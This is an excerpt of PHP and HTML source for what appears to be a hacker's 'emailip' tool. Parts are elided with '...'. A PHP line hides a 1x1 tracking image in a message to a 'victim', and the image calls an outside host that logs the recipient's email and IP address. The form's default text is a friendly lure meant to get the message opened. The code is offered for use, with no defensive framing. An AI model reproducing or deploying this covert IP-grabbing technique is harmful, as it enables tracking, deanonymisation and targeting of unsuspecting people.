...
$vicmessage .= "\n<img src=http://r-fx.madhosts.com/~nemohacker/php/emailip.php?email=$email&victim=$victim&s=3 height=1 width=1>";
...
<p>
    ...
    <p><a href="emailip.php3?s=1"><font face="Courier New, Courier, mono">Do it 
...
?>
<form action=emailip.php3 method=post>
<div align="center"><br>
    <table width="552" border="0" cellspacing="2" cellpadding="2">
      ...
      <tr> 
        ...
        <td width="342"> 
          <textarea name="vicmessage" wrap="VIRTUAL">how you doin? long time no see.</textarea>
        </td>
      </tr>
      <tr>
        <td width="196" valign="top">
